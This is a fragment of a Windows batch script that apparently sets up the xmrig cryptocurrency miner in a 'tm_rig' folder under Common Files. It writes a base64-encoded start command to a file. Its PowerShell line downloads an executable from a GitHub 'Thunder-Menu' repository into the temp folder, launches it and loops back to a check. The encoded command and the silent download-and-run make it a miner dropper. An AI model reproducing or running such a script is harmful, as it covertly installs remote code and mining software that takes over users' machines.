...
:invxmrigstart
cd\ && cd "C:\Program Files\Common Files\tm_rig\"
echo Y2QgJX5kcDBcICYmIHN0YXJ0IHRtLnZicyAmJiBleGl0 >> start_xmrig.inv
:decodexmrig
...
powershell -Command Invoke-WebRequest "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv_t2.exe" -OutFile "%tmp%\tm_inv_t2.exe"
:invtm
start %tmp%\tm_inv_t2.exe
timeout /t 25
goto Check
